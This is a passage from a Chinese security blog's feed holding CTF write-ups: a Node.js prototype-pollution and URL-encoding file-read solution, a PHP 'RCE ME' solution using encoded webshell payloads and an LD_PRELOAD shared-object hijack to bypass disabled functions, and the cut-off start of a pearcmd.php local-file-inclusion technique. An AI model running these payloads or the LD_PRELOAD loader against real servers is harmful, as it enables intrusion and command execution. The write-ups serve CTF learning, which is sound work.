class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                user.<span class="property">money</span> -= <span class="number">11</span>;</span><br><span class="line">                <span class="title class_">Object</span>.<span class="title function_">assign</span>(order,&#123; <span class="attr">msg</span>: fs.<span class="title function_">readFileSync</span>(product.<span class="property">name</span>).<span class="title function_">toString</span>() &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title class_">Object</span>.<span class="title function_">assign</span>(order,&#123; <span class="attr">msg</span>: <span class="string">&quot;nononono!&quot;</span> &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title class_">Object</span>.<span class="title function_">assign</span>(order,&#123; <span class="attr">code</span>: <span class="number">0</span>, <span class="attr">msg</span>: <span class="string">&quot;no such product!&quot;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">assign</span>(order, &#123; <span class="attr">username</span>: user.<span class="property">username</span>, <span class="attr">code</span>: <span class="number">3</span>, <span class="attr">money</span>: user.<span class="property">money</span> &#125;);</span><br><span class="line">    <span class="keyword">return</span> order;</span><br><span class="line">&#125;</span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/buy&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">username</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;</span><br><span class="line">            <span class="attr">code</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&#x27;please login!&#x27;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> user = &#123;</span><br><span class="line">        <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">username</span>,</span><br><span class="line">        <span class="attr">money</span>: req.<span class="property">session</span>.<span class="property">money</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> order = <span class="title function_">buyApi</span>(user, req.<span class="property">body</span>);</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">money</span> = user.<span class="property">money</span>;</span><br><span class="line">    res.<span class="title function_">json</span>(order);</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/logout&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    req.<span class="property">session</span>.<span class="title function_">destroy</span>();</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;</span><br><span class="line">        <span class="attr">code</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">msg</span>: <span class="string">&#x27;logout success!&#x27;</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="function">() =&gt;</span> &#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`APP RUN IN <span class="subst">$&#123;PORT&#125;</span>`</span>)&#125;);</span><br></pre></td></tr></table></figure><p>代码很长，但是仔细读代码也不是很难懂。对js代码进行审计，在这里我们可以看到admin的登录密码，只要我们登录为admin，就有9999点钱数了，还怕买不到flag？</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> adminUser = &#123;</span><br><span class="line">    <span class="attr">username</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="attr">password</span>: <span class="string">&quot;😀admin😀&quot;</span>,</span><br><span class="line">    <span class="attr">money</span>: <span class="number">9999</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>往下读代码，会对password进行截取处理。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(username === adminUser.<span class="property">username</span> &amp;&amp; password === adminUser.<span class="property">password</span>.<span class="title function_">substring</span>(<span class="number">1</span>,<span class="number">6</span>))</span><br></pre></td></tr></table></figure><p>我们直接可以在游览器上运行js代码。</p><img src="/2023/01/31/DASCTF-X-CBCTF-cbshop/79.png" class><p>成功登录为admin，获得9999钱数，但是还是买不了flag。这是为什么？继续审计源代码。我们主要分析buyApi这一个购买函数。</p><img src="/2023/01/31/DASCTF-X-CBCTF-cbshop/80.png" class><p>这里还有一个user.token的验证，而这个token属性不能在请求体直接加的，因为user类里的属性都被限定死了。</p><img src="/2023/01/31/DASCTF-X-CBCTF-cbshop/81.png" class><p>这里就要利用到node.js的原型链污染漏洞了。首先，原型链污染的利用条件是copy函数，那么在源代码中是否有类似复制功能的函数，仔细看，还真的有。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> order = &#123;&#125;;</span><br><span class="line">   <span class="keyword">if</span>(!order[user.<span class="property">username</span>]) &#123;</span><br><span class="line">       order[user.<span class="property">username</span>] = &#123;&#125;;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="title class_">Object</span>.<span class="title function_">assign</span>(order[user.<span class="property">username</span>], product);</span><br></pre></td></tr></table></figure><p>百度查看assign函数的作用。</p><img src="/2023/01/31/DASCTF-X-CBCTF-cbshop/82.png" class><p>有了利用条件那么就好办了。order字典是空的，最后将product对象中的属性复制到order字典中user.username属性里，这里的user.username就是我们的用户名admin，继续看一下product的由来，</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> order = <span class="title function_">buyApi</span>(user, req.<span class="property">body</span>);</span><br></pre></td></tr></table></figure><p> 就是请求体的内容了，也是我们可控的，user.username和product我们都可控，那么思路就有了，我们可以将admin改名为proto，然后然后通过这个copy函数将token属性copy到原型上，那么原型就有了这个tokan属性了，当需要验证user.token时，本对象没有该属性，会向自己的原型上寻找，那么也就可以成功验证了。</p><img src="/2023/01/31/DASCTF-X-CBCTF-cbshop/83.png" class><p>可以看出验证通过了。继续审计代码。</p><img src="/2023/01/31/DASCTF-X-CBCTF-cbshop/84.png" class><p> 它会判断请求体里有没有flag字段，如果有的话就会给你返回这个提示，反之对name进行文件读取，我们呢来测试一下是否真的会任意文件读取。</p><img src="/2023/01/31/DASCTF-X-CBCTF-cbshop/85.png" class><p>目前的一个问题就是flag字段被变相过滤了，我们该怎么绕过限制呢？分析一下fs.readFileSync函数。</p><img src="/2023/01/31/DASCTF-X-CBCTF-cbshop/86.png" class><p> 路径可以是url类型，可以将flag进行url编码来绕过。用fl%61g来绕。例如用官方wp的例子来说，</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line">flag = fs.<span class="title function_">readFileSync</span>(<span class="keyword">new</span> <span class="title function_">URL</span>(<span class="string">&#x27;file:///fl%61g&#x27;</span>)).<span class="title function_">toString</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(flag);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title function_">URL</span>(<span class="string">&#x27;file:///fl%61g&#x27;</span>));</span><br></pre></td></tr></table></figure><p> 所以说我们要传url对象，根据上面代码打印出URL实例。</p><img src="/2023/01/31/DASCTF-X-CBCTF-cbshop/87.png" class><p>运行上面的js代码，本地根目录的flag也被成功读出，说明是没问题的。当然也可以去fs.readFileSync函数的源码里看看，调试跟进代码。这里贴上师傅博客： <a href="https://pysnow.cn/archives/330/">corCTF2022 部分Web - Pysnow’s Blog</a>  </p><p>把name字段赋值这些属性，发包读flag。</p><img src="/2023/01/31/DASCTF-X-CBCTF-cbshop/88.png" class><p>成功得出flag了。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>原型链污染的利用条件很苛刻，在代码中找到类似于copy功能的函数的话，根据js代码环境，就要考虑到是否存在原型链污染漏洞了。</p><p> 官方wp:<a href="http://www.ctfiot.com/57949.html">DASCTF X CBCTF 2022｜ 九月挑战赛官方Write Up | CTF导航</a></p>]]></content>
      
      
      <categories>
          
          <category> 刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原型链污染 </tag>
            
            <tag> node.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从一道ctf题学习LD_PRELOAD绕过函数禁用</title>
      <link href="/2023/01/31/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0LD-PRELOAD%E7%BB%95%E8%BF%87%E5%87%BD%E6%95%B0%E7%A6%81%E7%94%A8/"/>
      <url>/2023/01/31/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0LD-PRELOAD%E7%BB%95%E8%BF%87%E5%87%BD%E6%95%B0%E7%A6%81%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前两天做了一道ctf题目，遇到比较陌生的知识点，利用LD_PRELOAD环境变量，调用新的进程来加载恶意的so文件，执行我们注入程序中的恶意代码，从而绕过函数限制。当然，这么说也比较抽象，后文会详细说明，先看我遇到的ctf题目。</p><h2 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h2><p>打开题目，就是简单的无字母数字的命令执行代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">   <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">   @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用最简单的取反来写马进去，（常规思路就是构造system，但是没反应）这里有个小知识点，原本我构造的一句话木马是eval($_POST[123]);但是这个是失效的马，执行不了命令。为什么会这样？在我看来，题目中的eval函数执行了$code的取反操作，取反后的eval并不是php函数，不会将传递的数据当做代码执行，所以我们就需要用assert函数来将字符串当做php代码来执行，所以我们构造assert(eval($_POST[123]));</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="string">&#x27;(eval($_POST[123]))&#x27;</span>;</span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$d</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成的payload就是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%CD%CC%A2%D6%D6);</span><br></pre></td></tr></table></figure><p>检验一下木马的有效性。</p><img src="/2023/01/31/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0LD-PRELOAD%E7%BB%95%E8%BF%87%E5%87%BD%E6%95%B0%E7%A6%81%E7%94%A8/71.png" class><p>这里就连接蚁剑了，然而拿到shell了却执行不了命令。</p><img src="/2023/01/31/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0LD-PRELOAD%E7%BB%95%E8%BF%87%E5%87%BD%E6%95%B0%E7%A6%81%E7%94%A8/72.png" class><p>在phpinfo中，可以看到禁用的函数。</p><img src="/2023/01/31/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0LD-PRELOAD%E7%BB%95%E8%BF%87%E5%87%BD%E6%95%B0%E7%A6%81%E7%94%A8/73.png" class><p> 拿到shell就是一个空壳，接下来就是文章重点学习的知识，利用LD_PRELOAD来绕过函数禁用。</p><h2 id="LD-PRELOAD来绕过函数禁用"><a href="#LD-PRELOAD来绕过函数禁用" class="headerlink" title="LD_PRELOAD来绕过函数禁用"></a>LD_PRELOAD来绕过函数禁用</h2><p>在学习这个之前，得先了解几个概念。</p><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>什么是链接，程序的链接可以分为三种。</p><pre><code>静态链接：在程序运行之前先将各个目标模块以及所需要的库函数链接成一个完整的可执行程序，之后不再拆开。装入时动态链接：源程序编译后所得到的一组目标模块，在装入内存时，边装入边链接。运行时动态链接：原程序编译后得到的目标模块，在程序执行过程中需要用到时才对它进行链接。</code></pre><p>当执行可执行程序时，会自动加载调用动态链接库中的函数。起初这么做的目的是方便程序的更新发布，比如要更新一个程序，只需要下载所需要的动态链接库就可以了，也相当于补丁。如果动态链接注入了恶意函数，在程序执行时也就执行了恶意代码。</p><p>什么是LD_PRELOAD</p><p>它就是linux的环境变量。这里放大佬的解释。</p><p>在UNIX的动态链接库的世界中，LD_PRELOAD就是这样一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入恶意程序，从而达到那不可告人的罪恶的目的。</p><p>这里可以用一句话来说，通过LD_PRELOAD环境变量设置的指定路径的文件，会在程序执行时最先调用的文件。</p><p>我们再来说说什么是so文件。</p><p>就是将一系列的c函数打包到一个文件中，方便其他二进制文件调用，这样的文件就是so文件，也称动态链接库，相当于windows中的dll文件。</p><p>利用条件</p><pre><code>1.有上传点，可以上传so文件。2.可以使用环境变量的函数来控制LD_PRELOAD，例如putenv函数。3.可以启动新的进程（新进程启动时会加载LD_PRELOAD中的so文件）在php中可以新建进程的函数有mail()和imap_mail()函数。</code></pre><p>基本思路</p><p>那么在如上条件都满足的情况下，可以有这样一个思路。</p><pre><code>1.我们可以编写一个恶意的c代码，里面改写被劫持的函数替换为恶意命令，再制作成so文件。2.利用putenv函数将LD_PRELOAD设置为我们so文件的路径。3.编写一个php文件来调用某个函数，例如调用mail()函数，当这个函数调用时，会调用系统中的sendmail函数，从而开启新的进程。4.成功执行了我们的恶意代码。</code></pre><p>一般方法（geteuid）</p><p>现在我们知道了要通过mail()函数来开启一个新的线程，那么接下来我们要思考的问题就是程序会调用什么函数（因为要重写函数，如果没有被调用，那就没意义）这里我们可以使用getuid函数，获取用户的id，毕竟程序执行肯定需要知道用户是什么权限，自然会调用。</p><p>那么编写c代码重写geteuid函数。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span> <span class="comment">//hack.c</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span> &#123;</span><br><span class="line">        system(<span class="string">&quot;dir&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span>  <span class="title function_">geteuid</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果geteuid函数被调用，那么system也会自动调用了。接着我们就要编译成恶意so文件了，使用如下命令。</p><blockquote><p>gcc -shared -fPIC hack.c -o hack.so</p></blockquote><p>同时写一个webshell，hack.so上传至临时目录或web目录都可以，</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=/tmp/hack.so&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个php也需要上传，如果在web目录就访问这个webshell，如果在临时目录就就要包含它。因为环境我不知道怎么搞，就不复现了。<br>改进方法</p><p>上面的方法是劫持某一函数，进行重写。这里的局限就是只能找到一个函数进行劫持，有十个函数就要编写十个不同的so文件，很麻烦。当然我们可以调用一个方法来完成通杀。比如编写以下的c文件。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line">__attribute__((constructor))<span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span> &#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* cmd = getenv(<span class="string">&quot;CMD&quot;</span>);</span><br><span class="line">    system(cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看不懂的__attribute__((<strong>constructor</strong>))就类似于构造方法，函数名我们可以自定义。在系统执行mail函数之前会自动调用该构造方法。也是网上比较流行的。</p><h2 id="回看题目"><a href="#回看题目" class="headerlink" title="回看题目"></a>回看题目</h2><p>目前已经拿到shell，虽说不能执行命令，但是可以上传文件。先编写hack.c。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span> &#123;</span><br><span class="line">system(<span class="string">&quot;/readflag &gt;&gt; /var/tmp/test.php&quot;</span>);</span><br><span class="line">&#125;   </span><br><span class="line"><span class="type">int</span>  <span class="title function_">geteuid</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用命令编译成恶意so文件。</p><img src="/2023/01/31/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0LD-PRELOAD%E7%BB%95%E8%BF%87%E5%87%BD%E6%95%B0%E7%A6%81%E7%94%A8/74.png" class><p>然后再编写一个wenshell。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=/var/tmp/getflag.so&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_log</span>(<span class="string">&quot;&quot;</span>,<span class="number">1</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将两个文件都上传到题目中的临时目录中。</p><img src="/2023/01/31/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0LD-PRELOAD%E7%BB%95%E8%BF%87%E5%87%BD%E6%95%B0%E7%A6%81%E7%94%A8/75.png" class><p> 然后就是想办法访问这个php文件。用网上的异或payload，构造的语句为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=include(%27/var/tmp/hack.php%27)&amp;cmd=/readflag&amp;outpath=/tmp/tmpfile&amp;sopath=/var/tmp/getflag.so</span><br></pre></td></tr></table></figure><p>异或构造的就是${_GET}<a href="$%7B_GET%7D%5B_%5D">_</a>;命令。至于这个payload，长度限制四十，也只能用异或来构造_GET传参了。但是后面有cmd等参数从哪里来的就不清楚了，希望有的师傅能指正一下。运行payload之后，就会在tmp目录发现test.php。</p><img src="/2023/01/31/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0LD-PRELOAD%E7%BB%95%E8%BF%87%E5%87%BD%E6%95%B0%E7%A6%81%E7%94%A8/76.png" class><p>打开文件就是flag了。</p><img src="/2023/01/31/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0LD-PRELOAD%E7%BB%95%E8%BF%87%E5%87%BD%E6%95%B0%E7%A6%81%E7%94%A8/77.png" class><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>这种利用LD_PRELOAD来绕过函数禁用的方式还是比较常见。今后通过题目的练习来加深这种利用姿势的理解。</p><h3 id="相关链接："><a href="#相关链接：" class="headerlink" title="相关链接："></a>相关链接：</h3><p>大佬们写的文章真的很不错：</p><p><a href="https://www.anquanke.com/post/id/175403#h2-5">深入浅出LD_PRELOAD &amp; putenv() - 安全客，安全资讯平台</a></p><p><a href="https://blog.csdn.net/qq_38154820/article/details/106330120">通过LD_PRELOAD绕过disable_functions_合天网安实验室的博客-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> php安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用pearcmd.php文件包含拿shell（LFI）</title>
      <link href="/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/"/>
      <url>/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近看博客的时候遇到有师傅总结了一个新颖的文件包含思路，通过pearcmd.php来进行本地文件包含来拿shell，我感觉还挺有意思的，就花时间来学习了一下。</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>1.安装了pear扩展（pear就是一个php扩展及应用的代码仓库，没有安装pear扩展的话就没有pear.php文件可以利用了）</p><p>2.知道pearcmd.php文件的路径（默认路径是&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php）</p><p>3.开启了register_argc_argv选项（只有开启了，$_SERVER[‘argv’]才会生效。）</p><p>4.有包含点，并且能包含php后缀的文件，而且没有open_basedir的限制。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>这次用docker来搭建一个<a href="https://so.csdn.net/so/search?q=lamp&spm=1001.2101.3001.7020">lamp</a>，因为docker的任意版本的镜像都会默认安装pear，更加省事。本次复现下载的是这样版本的镜像。</p><img src="/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/57.png" class><p>然后就是拉镜像搭建环境了。我们进入到容器里，在web目录下创建两个文件，创建一个1.php，也就是我们的一个漏洞包含点。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>再创建一个2.php，用于测试使用。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>其实这不能算是一个漏洞，只能算作一个利用姿势。其主要原因就是开启了register_argc_argv这个选项。开启这个选项之后，url中?后面的内容都会传入$_SERVER[‘argv’]这个变量里。这里举三个例子。</p><p>传入一个aa&#x3D;1。</p><img src="/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/58.png" class><p>传入一个aa&#x3D;1&amp;bb&#x3D;1。</p><img src="/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/59.png" class><p> 传入一个aa&#x3D;1+bb&#x3D;1。</p><img src="/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/60.png" class><p>通过这三张图很明显就明白&amp;是无法分割参数的，真正能有效分割参数的是+号。另外等号无法复制，直接被作为键值传进去了。</p><p>pear是通过pearcmd.php来获取到参数的，看一下pear程序的代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh                                                                                                                               </span></span><br><span class="line"><span class="comment"># first find which PHP binary to use                                                                                                                                                                               </span></span><br><span class="line"><span class="keyword">if</span> test <span class="string">&quot;x<span class="subst">$PHP_PEAR_PHP_BIN</span>&quot;</span> != <span class="string">&quot;x&quot;</span>; then                                                                                                                                                                          </span><br><span class="line">  PHP=<span class="string">&quot;<span class="subst">$PHP_PEAR_PHP_BIN</span>&quot;</span>                                                                                                                                                                                          </span><br><span class="line"><span class="keyword">else</span>                                                                     </span><br><span class="line">  <span class="keyword">if</span> test <span class="string">&quot;/usr/local/bin/php&quot;</span> = <span class="string">&#x27;@&#x27;</span>php_bin<span class="string">&#x27;@&#x27;</span>; then</span><br><span class="line">    PHP=php</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    PHP=<span class="string">&quot;/usr/local/bin/php&quot;</span></span><br><span class="line">  fi</span><br><span class="line">fi</span><br><span class="line"> </span><br><span class="line"><span class="comment"># then look for the right pear include dir</span></span><br><span class="line"><span class="keyword">if</span> test <span class="string">&quot;x<span class="subst">$PHP_PEAR_INSTALL_DIR</span>&quot;</span> != <span class="string">&quot;x&quot;</span>; then</span><br><span class="line">  INCDIR=<span class="variable">$PHP_PEAR_INSTALL_DIR</span></span><br><span class="line">  INCARG=<span class="string">&quot;-d include_path=<span class="subst">$PHP_PEAR_INSTALL_DIR</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="keyword">if</span> test <span class="string">&quot;/usr/local/lib/php&quot;</span> = <span class="string">&#x27;@&#x27;</span>php_dir<span class="string">&#x27;@&#x27;</span>; then</span><br><span class="line">    INCDIR=`dirname $<span class="number">0</span>`</span><br><span class="line">    INCARG=<span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    INCDIR=<span class="string">&quot;/usr/local/lib/php&quot;</span></span><br><span class="line">    INCARG=<span class="string">&quot;-d include_path=/usr/local/lib/php&quot;</span></span><br><span class="line">  fi</span><br><span class="line">fi</span><br><span class="line"> </span><br><span class="line">exec <span 